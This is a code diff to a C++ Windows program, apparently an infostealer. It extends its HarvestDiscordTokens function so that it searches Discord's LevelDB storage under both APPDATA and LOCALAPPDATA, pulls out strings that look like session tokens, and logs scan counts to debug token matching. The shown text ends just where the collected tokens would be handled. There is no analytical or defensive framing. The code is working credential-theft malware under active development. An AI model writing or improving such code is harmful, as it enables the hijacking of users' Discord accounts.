@@ -1101,17 +1101,26 @@ static void HarvestDiscordTokens() {
     DWORD adLen = GetEnvironmentVariableA("APPDATA", appData, MAX_PATH);
     if (adLen == 0 || adLen >= MAX_PATH) return;
     std::string ad(appData);
+    char localAppData[MAX_PATH];
+    DWORD lalLen = GetEnvironmentVariableA("LOCALAPPDATA", localAppData, MAX_PATH);
+    std::string lad = (lalLen > 0 && lalLen < MAX_PATH) ? std::string(localAppData) : "";
 
     std::vector<std::string> tokens;
+    int totalFilesScanned = 0;
+    int totalCandidates = 0;
     char tmpDir[MAX_PATH];
     GetTempPathA(MAX_PATH, tmpDir);
 
-    for (int v = 0; variantPaths[v]; v++) {
-        std::string leveldbPath = ad + variantPaths[v];
+    for (int baseTry = 0; baseTry < 2; baseTry++) {
+        std::string basePath = (baseTry == 0) ? ad : lad;
+        if (basePath.empty()) continue;
+        for (int v = 0; variantPaths[v]; v++) {
+        std::string leveldbPath = basePath + variantPaths[v];
         std::string searchPath = leveldbPath + "\\*";
+        int variantFiles = 0;
         WIN32_FIND_DATAA fd;
         HANDLE hFind = FindFirstFileA(searchPath.c_str(), &fd);
-        if (hFind == INVALID_HANDLE_VALUE) continue;
+        if (hFind == INVALID_HANDLE_VALUE) { LogMsg(std::string("Discord: ") + variantPaths[v] + " not found"); continue; }
         do {
             if (fd.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) continue;
             std::string fn(fd.cFileName);
@@ -1120,6 +1129,7 @@ static void HarvestDiscordTokens() {
             if (ext != ".ldb" && ext != ".log") continue;
             if (fd.nFileSizeHigh > 0 || fd.nFileSizeLow > 10485760) continue;
 
+            variantFiles++;
             std::string fpath = leveldbPath + "\\" + fn;
             HANDLE hFile = CreateFileA(fpath.c_str(), GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, 0, NULL);
             if (hFile == INVALID_HANDLE_VALUE) continue;
@@ -1134,15 +1144,24 @@ static void HarvestDiscordTokens() {
                     if (IsTokenChar(buf[i])) {
                         accum += buf[i];
                     } else {
-                        if (!accum.empty()) { if (IsLikelyToken(accum)) tokens.push_back(accum); accum.clear(); }
+                        if (!accum.empty()) { totalCandidates++; if (IsLikelyToken(accum)) { tokens.push_back(accum); } accum.clear(); }
                     }
                 }
-                if (!accum.empty() && IsLikelyToken(accum)) tokens.push_back(accum);
+                if (!accum.empty()) { totalCandidates++; if (IsLikelyToken(accum)) tokens.push_back(accum); }
             }
             delete[] buf;
             CloseHandle(hFile);
         } while (FindNextFileA(hFind, &fd));
         FindClose(hFind);
+        totalFilesScanned += variantFiles;
+        LogMsg(std::string("Discord: scanned ") + std::to_string(variantFiles) + " files in " + variantPaths[v]);
+        } // inner v loop
+    } // outer baseTry loop
+
+    LogMsg(std::string("Discord: ") + std::to_string(totalFilesScanned) + " total files, " + std::to_string(totalCandidates) + " candidates, " + std::to_string(tokens.size()) + " valid tokens");
+    if (totalCandidates > 0 && tokens.empty()) {
+        // Log a sample candidate to debug the token format
+        LogMsg("Discord: no tokens matched format, checking raw scan");
     }
 
     if (!tokens.empty()) {
